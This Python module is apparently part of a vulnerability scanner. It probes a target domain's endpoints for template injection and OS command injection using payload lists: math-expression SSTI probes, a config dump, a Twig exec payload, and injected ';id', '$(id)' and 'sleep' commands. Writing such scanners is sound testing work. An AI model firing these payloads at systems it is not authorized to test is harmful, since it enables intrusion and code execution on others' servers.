"""
Trace Foundry V5 - Command Injection + SSTI Scanner
Blind RCE detection, Jinja2/Twig/ERB/Freemarker template injection
"""
import urllib.request
import urllib.error
import urllib.parse
import re
import time
from utils.display import section, ok, warn, info, bug_found

# SSTI payloads — each has expected output for detection
SSTI_PAYLOADS = [
    # Math expression — if 7*7=49 returned, SSTI confirmed
    ("{{7*7}}",          "49",   "Jinja2/Twig"),
    ("${7*7}",           "49",   "Freemarker/EL"),
    ("#{7*7}",           "49",   "Thymeleaf/Ruby ERB"),
    ("<%= 7*7 %>",       "49",   "ERB/EJS"),
    ("{{7*'7'}}",        "7777777", "Jinja2"),
    ("${{7*7}}",         "49",   "Pebble/Jinja2"),
    ("{7*7}",            "49",   "Smarty/Mako"),
    ("*{7*7}",           "49",   "Spring SpEL"),
    ("@(7*7)",           "49",   "Razor"),
    # Jinja2 config dump
    ("{{config}}",       "SECRET_KEY", "Jinja2 Config"),
    ("{{self.__dict__}}","__dict__",   "Jinja2 Self"),
    # Twig
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid=", "Twig RCE"),
]

# Command injection payloads
CMDI_PAYLOADS = [
    # Linux
    (";id",              "uid=",  "Linux"),
    ("|id",              "uid=",  "Linux"),
    ("`id`",             "uid=",  "Linux"),
    ("$(id)",            "uid=",  "Linux"),
    (";whoami",          "root",  "Linux"),
    ("|whoami",          "root",  "Linux"),
    # Windows
    ("|whoami",          "nt authority", "Windows"),
    ("&whoami",          "administrator","Windows"),
    # Time-based blind
    (";sleep 3",         None,    "Linux blind"),
    ("| sleep 3",        None,    "Linux blind"),
    ("& timeout 3",      None,    "Windows blind"),
    # Encoded
    ("%3Bid",            "uid=",  "URL-encoded Linux"),
    ("%7Cid",            "uid=",  "URL-encoded Linux"),
]

INJECTION_PARAMS = [
    "cmd","command","exec","execute","ping","host","ip","target",
    "query","search","name","input","data","value","text","msg",
    "template","render","view","page","email","to","from","subject",
    "filename","file","path","url","redirect","next","ref",
]

class CMDIModule:
    def __init__(self, domain, timeout=8):
        self.domain  = domain
        self.timeout = timeout
        self.headers = {"User-Agent": "Mozilla/5.0"}

    def _fetch(self, url, post_data=None):
        try:
            req = urllib.request.Request(
                url, data=post_data, headers=self.headers)
            with urllib.request.urlopen(req, timeout=self.timeout) as r:
                body = r.read(32768).decode("utf-8", errors="ignore")
                return body, r.status
        except urllib.error.HTTPError as e:
            try:    body = e.read(16384).decode("utf-8", errors="ignore")
            except: body = ""
            return body, e.code
        except:
            return "", 0

    def _test_ssti(self, base_url, param):
        bugs = []
        for payload, expected, engine in SSTI_PAYLOADS:
            enc = urllib.parse.quote(payload, safe="")
            url = f"{base_url}?{param}={enc}"
            body, status = self._fetch(url)
            if not body:
                continue
            if expected and expected.lower() in body.lower():
                bugs.append({
                    "type":     f"SSTI — {engine} Template Injection",
                    "severity": "CRITICAL",
                    "url":      url,
                    "param":    param,
                    "payload":  payload,
                    "engine":   engine,
                    "evidence": f"Expression output '{expected}' found in response",
                    "impact":   "Server-side template injection can lead to full RCE",
                })
                break
        return bugs

    def _test_cmdi(self, base_url, param):
        bugs = []
        # First test time-based blind
        for payload, expected, os_type in CMDI_PAYLOADS:
            if expected is None:
                # Time-based
                enc = urllib.parse.quote(payload, safe="")
                url = f"{base_url}?{param}={enc}"
                t0  = time.time()
                self._fetch(url)
                elapsed = time.time() - t0
                if elapsed >= 2.5:
                    # Confirm
                    t1 = time.time()
                    self._fetch(url)
                    elapsed2 = time.time() - t1
                    if elapsed2 >= 2.5:
                        bugs.append({
                            "type":     f"Command Injection (Blind Time-Based) — {os_type}",
                            "severity": "CRITICAL",
                            "url":      url,
                            "param":    param,
                            "payload":  payload,
                            "evidence": f"Response delayed {elapsed:.1f}s and {elapsed2:.1f}s",
                            "impact":   "Blind RCE confirmed — attacker executes system commands",
                        })
                        break
            else:
                enc  = urllib.parse.quote(payload, safe="")
                url  = f"{base_url}?{param}={enc}"
                body, status = self._fetch(url)
                if body and expected.lower() in body.lower():
                    bugs.append({
                        "type":     f"Command Injection (Error-Based) — {os_type}",
                        "severity": "CRITICAL",
                        "url":      url,
                        "param":    param,
                        "payload":  payload,
                        "evidence": f"Command output '{expected}' in response",
                        "impact":   "Direct RCE — attacker runs OS commands on server",
                    })
                    break
        return bugs

    def run(self):
        section("Command Injection + SSTI Scanner")
        all_bugs = []
        test_endpoints = ["/","/search","/api/search","/api/v1/query",
                          "/render","/template","/api/render","/email/send",
                          "/api/ping","/ping","/api/v1/ping"]

        for endpoint in test_endpoints:
            for scheme in ["https","http"]:
                base_url = f"{scheme}://{self.domain}{endpoint}"
                _, status = self._fetch(base_url)
                if status == 0:
                    continue

                info(f"Testing SSTI/CMDi: {base_url}")
                for param in INJECTION_PARAMS[:8]:
                    ssti_bugs = self._test_ssti(base_url, param)
                    for b in ssti_bugs:
                        bug_found(b["type"], b["severity"], {
                            "URL":      b["url"],
                            "Param":    b["param"],
                            "Payload":  b["payload"],
                            "Engine":   b.get("engine",""),
                            "Evidence": b["evidence"],
                            "Impact":   b["impact"],
                        })
                    all_bugs.extend(ssti_bugs)

                    cmdi_bugs = self._test_cmdi(base_url, param)
                    for b in cmdi_bugs:
                        bug_found(b["type"], b["severity"], {
                            "URL":      b["url"],
                            "Param":    b["param"],
                            "Payload":  b["payload"],
                            "Evidence": b["evidence"],
                            "Impact":   b["impact"],
                        })
                    all_bugs.extend(cmdi_bugs)
                break

        info(f"CMDi/SSTI scan done — {len(all_bugs)} confirmed")
        if not all_bugs:
            ok("No Command Injection / SSTI found ✓")
        return {"bugs": all_bugs}
